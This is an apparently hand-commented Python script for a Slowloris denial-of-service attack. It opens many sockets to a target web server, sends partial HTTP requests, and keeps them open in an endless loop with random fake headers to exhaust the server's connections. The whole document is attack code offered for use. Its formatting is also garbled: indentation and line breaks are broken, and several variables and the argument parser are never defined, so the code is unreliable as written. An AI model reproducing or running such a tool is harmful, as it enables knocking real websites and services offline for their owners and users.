#Importing libarires

import argparse
import logging
import random
import socket
import sys
import time
import ssl 

#The port was set toport 80, which is usually the default port for webservers.

parser.add_argument(
 "-p",
 "--port",
 default=80,
 type=int
)
parser.add_argument(
 "-s",
 "--sockets",
 default=120,
 type=int,
)

#Construct an array of sockets to target the web sockets of the intended server.

list_of_sockets = []
class _(socket.socket):
      def send_line(self, line):
      line = f"{line}\r\n"
      self.send(line.encode("utf-8"))
      def send_header(self, name, value):
      self.send_line(f"{name}:
      {value}")
      socket.socket = _
def init_socket(ip): 
    x = socket.socket(socket.AF_INET,
socket.SOCK_STREAM)
 x.settimeout(4)
 if args.https:
 x = ssl.wrap_socket(x)
 x.connect((ip, args.port))
 x.send_line(f"GET
/?{random.randint(0, 1500)} HTTP/1.1")
 usa = user_agents[0]
 if args.randuseragent:
 usa =
random.choice(user_agents)
 x.send_header("User-Agent", usa)
 x.send_header("Accept-language",
"en-US,en,q=0.5")
 return x


#Set up a loop to send keep alive headers

def main():
    ip = args.host
    socket_count = args.sockets
 logging.info("Attacking with
    sockets.", ip, socket_count)
 logging.info("Creating sockets...")
 for _ in range(socket_count):
 try:
 logging.debug("Creating
socket nr %s", _)
 x = init_socket(ip)
 except socket.error as r:
 logging.debug(r)
 break
 list_of_sockets.append(x)
 while True:
 try:
 logging.info(
 "Sending keep-alive
headers... Socket count: %s",
 len(list_of_sockets),
 )
 for x in
list(list_of_sockets):
 try:
 x.send_header("Xa", random.randint(1, 7500))
 except socket.error:
list_of_sockets.remove(x)
 for _ in range(socket_count
- len(list_of_sockets)):

logging.debug("Recreating socket...")

try:
 x = init_socket(ip)
if x:

list_of_sockets.append(x)
 except socket.error as
r:
 logging.debug(r)
 break
 logging.debug("Sleeping for
%d seconds", args.sleeptime)
 time.sleep(args.sleeptime)
 except (KeyboardInterrupt,
SystemExit):
 logging.info("Stopping
Slowloris")
 break


